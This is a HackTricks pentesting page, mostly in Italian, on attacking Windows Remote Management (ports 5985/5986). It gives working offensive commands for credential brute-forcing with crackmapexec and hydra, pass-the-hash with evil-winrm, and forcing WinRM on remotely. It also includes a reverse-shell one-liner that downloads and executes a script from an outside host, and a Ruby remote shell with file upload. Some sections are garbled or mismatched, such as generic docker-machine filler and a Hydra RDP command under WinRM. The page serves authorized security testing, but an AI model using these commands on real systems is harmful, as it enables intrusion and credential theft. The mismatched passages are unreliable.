# 5985,5986 - Pentesting WinRM

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug bounty!

**Insight sull'hacking**\
Interagisci con contenuti che approfondiscono l'emozione e le sfide dell'hacking

**Notizie sull'hacking in tempo reale**\
Resta aggiornato sul mondo dell'hacking frenetico attraverso notizie e approfondimenti in tempo reale

**Ultime notizie**\
Rimani informato sul lancio delle nuove bug bounty e sugli aggiornamenti cruciali delle piattaforme

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **e inizia a collaborare con i migliori hacker oggi stesso!**

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx) √® evidenziato come un **protocollo di Microsoft** che consente la **gestione remota dei sistemi Windows** tramite HTTP(S), sfruttando SOAP nel processo. √à fondamentalmente alimentato da WMI, presentandosi come un'interfaccia basata su HTTP per le operazioni di WMI.

La presenza di WinRM su una macchina consente una semplice amministrazione remota tramite PowerShell, simile al funzionamento di SSH per altri sistemi operativi. Per determinare se WinRM √® operativo, √® consigliabile verificare l'apertura di porte specifiche:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

Una porta aperta dalla lista sopra indica che WinRM √® stato configurato, consentendo quindi tentativi di avviare una sessione remota.

### **Avvio di una sessione WinRM**

Per configurare PowerShell per WinRM, viene utilizzato il cmdlet `Enable-PSRemoting` di Microsoft, che configura il computer per accettare comandi remoti di PowerShell. Con l'accesso elevato a PowerShell, √® possibile eseguire i seguenti comandi per abilitare questa funzionalit√† e designare qualsiasi host come attendibile:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Questo approccio prevede l'aggiunta di un carattere jolly alla configurazione di `trustedhosts`, una procedura che richiede una considerazione attenta a causa delle sue implicazioni. Si nota inoltre che potrebbe essere necessario modificare il tipo di rete da "Pubblica" a "Lavoro" sulla macchina dell'attaccante.

Inoltre, WinRM pu√≤ essere **attivato in remoto** utilizzando il comando `wmic`, come dimostrato di seguito:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Questo metodo consente di configurare in remoto WinRM, aumentando la flessibilit√† nella gestione delle macchine Windows da remoto.


### Verifica della configurazione

Per verificare la configurazione della macchina di attacco, viene utilizzato il comando `Test-WSMan` per verificare se il target ha WinRM configurato correttamente. Eseguendo questo comando, ci si aspetta di ricevere dettagli sulla versione del protocollo e wsmid, indicando una configurazione riuscita. Di seguito sono riportati esempi che mostrano l'output atteso per un target configurato rispetto a uno non configurato:

- Per un target che **√®** configurato correttamente, l'output sar√† simile a questo:
```bash
Test-WSMan <target-ip>
```
La risposta dovrebbe contenere informazioni sulla versione del protocollo e wsmid, che indicano che WinRM √® configurato correttamente.

![](<../.gitbook/assets/image (161) (1).png>)

- Al contrario, per un obiettivo **non** configurato per WinRM, ci√≤ comporterebbe l'assenza di informazioni dettagliate, evidenziando l'assenza di una corretta configurazione di WinRM.

![](<../.gitbook/assets/image (162).png>)

### Esegui un comando

Per eseguire `ipconfig` in remoto su una macchina di destinazione e visualizzare il suo output, esegui:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

Puoi anche **eseguire un comando dalla tua console PS corrente tramite** _**Invoke-Command**_. Supponiamo che tu abbia localmente una funzione chiamata _**enumeration**_ e desideri **eseguirla su un computer remoto**, puoi farlo:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Esegui uno script

To execute a script on a target machine through WinRM, you can use the `Invoke-Command` cmdlet in PowerShell. This cmdlet allows you to run commands or scripts on remote machines.

```powershell
Invoke-Command -ComputerName <target> -ScriptBlock { <script> }
```

Replace `<target>` with the IP address or hostname of the target machine, and `<script>` with the script you want to execute.

For example, to execute a PowerShell script named `script.ps1` on a target machine with the IP address `192.168.1.100`, you would use the following command:

```powershell
Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock { C:\path\to\script.ps1 }
```

Make sure to provide the correct path to the script on the target machine.

This method can be useful for automating tasks or executing specific actions on remote machines during a penetration test.
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Ottenere una reverse-shell

Per ottenere una reverse-shell, √® necessario sfruttare una vulnerabilit√† o una configurazione errata nel servizio WinRM. Una reverse-shell consente a un attaccante di ottenere un accesso remoto al sistema target.

Ecco i passaggi generali per ottenere una reverse-shell utilizzando WinRM:

1. Identificare il servizio WinRM sul sistema target utilizzando uno scanner di porte o altre tecniche di rilevamento.
2. Verificare se il servizio WinRM √® configurato per consentire l'autenticazione tramite credenziali deboli o se √® presente una vulnerabilit√† nota.
3. Utilizzare uno strumento come `evil-winrm` o `winrs` per connettersi al servizio WinRM utilizzando le credenziali deboli o sfruttando la vulnerabilit√† identificata.
4. Una volta connessi al servizio WinRM, eseguire comandi remoti per ottenere una shell interattiva sul sistema target.

√à importante notare che l'ottenimento di una reverse-shell senza autorizzazione √® un'attivit√† illegale e pu√≤ comportare conseguenze legali gravi. Queste informazioni sono fornite solo a scopo educativo e per scopi di pentesting autorizzati.
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### Ottenere una sessione PS

Per ottenere una shell interattiva di PowerShell, utilizzare `Enter-PSSession`:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**La sessione verr√† eseguita in un nuovo processo (wsmprovhost) all'interno del "vittima"**

### **Forzare l'apertura di WinRM**

Per utilizzare PS Remoting e WinRM ma il computer non √® configurato, √® possibile abilitarlo con:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### Salvataggio e ripristino delle sessioni

Questo **non funzioner√†** se la **lingua** √® **vincolata** nel computer remoto.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
All'interno di queste sessioni √® possibile caricare script PS utilizzando _Invoke-Command_.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Errori

Se si riscontra il seguente errore:

`enter-pssession : Impossibile connettersi al server remoto 10.10.10.175 con il seguente messaggio di errore: Il client WinRM non pu√≤ elaborare la richiesta. Se lo schema di autenticazione √® diverso da Kerberos, o se il computer client non √® associato a un dominio, √® necessario utilizzare il trasporto HTTPS o aggiungere la macchina di destinazione alla configurazione delle TrustedHosts. Utilizzare winrm.cmd per configurare TrustedHosts. Si noti che i computer nell'elenco TrustedHosts potrebbero non essere autenticati. √à possibile ottenere ulteriori informazioni al riguardo eseguendo il seguente comando: winrm help config. Per ulteriori informazioni, consultare l'argomento della Guida about_Remote_Troubleshooting.`

Prova sul client (informazioni da [qui](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug!

**Approfondimenti sull'hacking**\
Interagisci con contenuti che approfondiscono l'emozione e le sfide dell'hacking

**Notizie sull'hacking in tempo reale**\
Resta aggiornato sul mondo dell'hacking frenetico attraverso notizie e approfondimenti in tempo reale

**Ultime notizie**\
Rimani informato sul lancio dei nuovi bug bounty e sugli aggiornamenti cruciali della piattaforma

Unisciti a noi su [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi stesso!

## Connessione WinRM in Linux

### Forza bruta

Fai attenzione, la forza bruta su WinRM potrebbe bloccare gli utenti.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### Utilizzo di evil-winrm

Evil-winrm √® uno strumento di pentesting che consente di sfruttare le vulnerabilit√† di WinRM per ottenere l'accesso non autorizzato a un sistema Windows. Questo strumento √® particolarmente utile durante un test di penetrazione per identificare e sfruttare le debolezze di WinRM.

Per utilizzare evil-winrm, √® necessario installare il framework Ruby e quindi eseguire il comando seguente:

```
evil-winrm -i <indirizzo_IP> -u <nome_utente> -p <password>
```

Dove `<indirizzo_IP>` √® l'indirizzo IP del sistema target, `<nome_utente>` √® il nome utente valido e `<password>` √® la password corrispondente. Una volta eseguito il comando, evil-winrm cercher√† di autenticarsi al sistema target utilizzando le credenziali fornite.

Una volta ottenuto l'accesso, evil-winrm fornisce un'interfaccia a riga di comando che consente di eseguire comandi sul sistema target, caricare e scaricare file, e persino ottenere un shell interattivo.

√à importante notare che l'utilizzo di evil-winrm per accedere a un sistema senza autorizzazione √® illegale e pu√≤ comportare conseguenze legali. Pertanto, √® fondamentale utilizzare questo strumento solo in un contesto legale e con il consenso del proprietario del sistema target.
```ruby
gem install evil-winrm
```
Leggi la **documentazione** sul suo github: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Per utilizzare evil-winrm per connettersi a un indirizzo IPv6, crea una voce all'interno di _**/etc/hosts**_ impostando un **nome di dominio** all'indirizzo IPv6 e connettiti a quel dominio.

### Passa l'hash con evil-winrm
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (173).png>)

### Utilizzo di una macchina PS-docker

To use a PS-docker machine, follow these steps:

1. Install Docker on your machine.
2. Open a PowerShell terminal.
3. Run the following command to create a new PS-docker machine:

```plaintext
docker-machine create --driver hyperv --hyperv-virtual-switch "Virtual Switch Name" ps-docker
```

Replace "Virtual Switch Name" with the name of the virtual switch you want to use.

4. Start the PS-docker machine by running the following command:

```plaintext
docker-machine start ps-docker
```

5. Connect to the PS-docker machine by running the following command:

```plaintext
docker-machine env ps-docker | Invoke-Expression
```

6. Verify that the PS-docker machine is running by running the following command:

```plaintext
docker-machine ls
```

You should see the PS-docker machine listed as "Running".

Now you can use the PS-docker machine to run PowerShell commands and scripts within a Docker container.
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Utilizzo di uno script ruby

**Codice estratto da qui: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)**
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Riferimenti

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## Comandi Automatici HackTricks
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‚ÄòMySuperSecr3tPass123!‚Äô

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Unisciti al server [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug!

**Approfondimenti sull'hacking**\
Interagisci con contenuti che approfondiscono l'emozione e le sfide dell'hacking

**Notizie sull'hacking in tempo reale**\
Resta aggiornato sul mondo dell'hacking frenetico attraverso notizie e approfondimenti in tempo reale

**Ultime notizie**\
Rimani informato sul lancio dei nuovi bug bounty e sugli aggiornamenti cruciali della piattaforma

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi stesso!

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
